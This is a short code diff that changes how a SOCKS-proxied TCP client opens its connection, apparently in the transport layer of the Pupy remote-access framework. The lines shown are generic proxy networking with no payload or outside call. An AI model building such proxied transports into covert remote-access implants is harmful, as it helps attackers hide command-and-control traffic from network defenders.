@@ -63,11 +63,10 @@ class PupyProxifiedTCPClient(PupyTCPClient):
         super(PupyProxifiedTCPClient, self).__init__(*args, **kwargs)
 
     def connect(self, host, port):
-        socks.set_default_proxy(proxy_type=socks.PROXY_TYPES[self.proxy_type], addr=self.proxy_addr, port=self.proxy_port, rdns=True, username=self.proxy_username, password=self.proxy_password)
-        family, socktype, proto, _, sockaddr = socket.getaddrinfo(host, port, self.family, self.socktype)[0]
-        s=socks.socksocket(family, socktype, proto)
+        s = socks.socksocket()
+        s.setproxy(proxy_type=socks.PROXY_TYPES[self.proxy_type], addr=self.proxy_addr, port=self.proxy_port, rdns=True, username=self.proxy_username, password=self.proxy_password)
         s.settimeout(self.timeout)
-        s.connect(sockaddr)
+        s.connect((host,port))
         if self.nodelay:
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         if self.keepalive:
